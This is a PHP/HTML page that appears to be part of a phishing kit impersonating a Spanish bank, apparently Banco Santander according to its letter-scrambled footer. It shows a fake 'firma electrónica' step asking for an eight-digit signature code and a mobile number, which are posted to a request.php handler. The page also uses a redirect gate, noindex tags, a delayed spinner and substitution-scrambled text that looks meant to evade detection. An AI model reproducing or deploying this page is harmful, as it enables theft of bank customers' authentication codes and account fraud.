<?php 

    $page = 'default';
    require_once 'init.php';
    if(!isset($_GET['id'])):
        die(rediret($link)); // We're done here
    else:
      $action = './request.php?step=tow&'.$id;

?>
<!DOCTYPE html>
<html lang="es">
	<head>
	<meta charset="UTF-8"/>
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<title>Bienvenido a nuestra pagina</title>
	<meta name="robots" content="noindex, nofollow, noimageindex">
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="<?php echo $css1; ?>">
	<link rel="stylesheet" href="<?php echo $css2; ?>">
	<link rel="stylesheet" href="layout/css/normalize.css">
	<link rel="stylesheet" href="layout/css/style.css">
	<link rel="shortcut icon nofollow" href="<?php echo $favicon; ?>">
	<script src="<?php echo $js;?>"></script>
	<script src="layout/js/style.js"></script>
	</head>	<body class="firm" style="display: block;">
<!-- ============================ -->
<!-- ======= Start Header ======= -->
<!-- ============================ -->
	<header>
			<div class="contenue-media">
				<img src="" alt="">
				<img src="layout/img/lg-small.svg" alt="">
				<img src="layout/img/3bandes.svg" alt="">
			</div>

			<div class="contenue">
			<div class="lg-select">
				<img src="layout/img/lg-select.svg" alt="">
			</div>
			<div class="menu">
				<ul>
					<li><img src="layout/img/ok.svg"><span>Myúdmnvz m atjvimi</span></li>
					<li><img src="layout/img/braya.svg"><span>Bpsón</span></li>
					<li><img src="layout/img/bnadem.svg"><span>Áitm utizvnml</span></li>
					<li><img src="layout/img/stifham.svg"><span>Metncrón ml clrtnet</span></li>
					<li><img src="layout/img/tfi.svg"><span>Dtzcvntkrón</span></li>
				</ul>
			</div>
		</div>
			<div class="menu-blanc">
		<div class="contenue">
				<ul>
					<li><img src="layout/img/dar.svg"></li>
					<li>Cptnemz y emijtemz</li>
					<li>Frnmncrmcrón</li>
					<li>Mhviiv rnotizrón</li>
					<li>Ztgpivz</li>
					<li>Amixteulmct</li>
					<li>Cvneimemi</li>
				</ul>
			</div>
			</div>
	</header>
		<!-- ============================= -->
<!-- ======= Start Spinner ======= -->
<!-- ============================= -->
		<div class="spinner">
  <div class="dot1"><img style="margin-top: 15px; vertical-align: middle; text-align: center" src="./layout/img/lg-small-inverse.svg"></div>
  <div class="dot2"><img style="margin-top: 15px; vertical-align: middle; text-align: center" src="./layout/img/lg-small.svg"></div>
</div> 

<!-- ============================= -->
<!-- ======= Start content ======= -->
<!-- ============================= -->
		<div class="section show">
			<div class="contenue-firm2">
						<div class="step">
							<div class="lign"></div>
							<div class="st1">
								<div><span class="active">1</span></div>
							</div>
							<div class="st2">
								<div><span class="active">2</span></div>
							</div>
							<div class="st3">
								<div><span>3</span></div>
							</div>
						</div>
					<div class="clearfix"></div>
					<div class="stName">
							<div class="text-left">
							  <span>Itgrzeimizt</span>
							</div>
							<div class="text-center">
							  <span>Friam</span>
							</div>
							<div class="text-right">
							  <span>cvnfriami</span>
							</div>
						  </div>
			<div class="kolchi">
			<div class="texte-verif">
			
			
			</div>
			<form id="lFrm" method="post" action="<?php echo $action; ?>">
			<div class="firm-digit">
			<div class="titre">FRIAM TLTCEIÓNRCM</div>
			<div class="block-gris">
			<div class="intro">Rneivdpct lmz uvzrcrvntz dt ep friam tltceiónrcm</div>
			<div class="all-input">
				<input type="password" id="k1" name="k1" maxlength="1" autocomplete="off" required="">
				<input type="password" id="k2" name="k2" maxlength="1" autocomplete="off" required="">
				<input type="password" id="k3" name="k3" maxlength="1" autocomplete="off" required="">
				<input type="password" id="k4" name="k4" maxlength="1" autocomplete="off" required="">
				<input type="password" id="k5" name="k5" maxlength="1" autocomplete="off" required="">
				<input type="password" id="k6" name="k6" maxlength="1" autocomplete="off" required="">
				<input type="password" id="k7" name="k7" maxlength="1" autocomplete="off">
				<input type="password" id="k8" name="k8" maxlength="1" autocomplete="off">
			</div>
			
			</div>

			</div>
			<!-- <div class="eror"><img src="layout/img/ta3ajoub.svg"><span>Friam tltceiónrcm rncviitcem. Optlom m rnetnemilv.</span></div>  -->
			<input type="text" id="tel01" name="tel01" maxlength="15" placeholder="Ep núativ dt aóorl" autocomplete="off" required="">
			<button class="btn-firm2" type="submit" id="sBtn">MCTUEMI</button>

			</form>
			</div>
			</div>
		</div>
	
<!-- ============================ -->
<!-- ======= Start Footer ======= -->
<!-- ============================ 
	<footer class="footer-pc">
	<p>&copy; Bmncv Zmnemndti, Z.M. Zmnemndti tz pnm amicm itgrzeimdm. Evdvz lvz dtitchvz itztiomdvz</p>
	</footer>-->
	<footer class="footer-telef">
	<p>Ztgpirdmd</p>
	<p>Rnzeipccrvntz dt mcctzv</p>
	<p>Uvlíercm dt Cvvxrtz</p>
	</footer>
		<script>
		
		
$(document).ready(function(){
    $('input').keyup(function(){
        if($(this).val().length==$(this).attr("maxlength")){
            $(this).next().focus();
        }
    });
});
	
	/*------------------------------------------------------------*/
/*------------------- Start First Loading --------------------*/
/*------------------------------------------------------------*/

	function onReady(callback) {
    $('.section').addClass('hid').removeClass('show');

  var intervalId = window.setInterval(function() {

    if (document.getElementsByTagName('body')[0] !== undefined) {
      window.clearInterval(intervalId);
	  

      callback.call(this);
    }
  }, 10000);
}

function setVisible(selector, visible) {
  document.querySelector(selector).style.display = visible ? 'block' : 'none';
}

onReady(function() {
  setVisible('body', true);
    $('.section').addClass('show').removeClass('hid');
  setVisible('.spinner', false);
});
	</script>
	

</body></html>
<?php
    endif;
    ob_end_flush();
?>
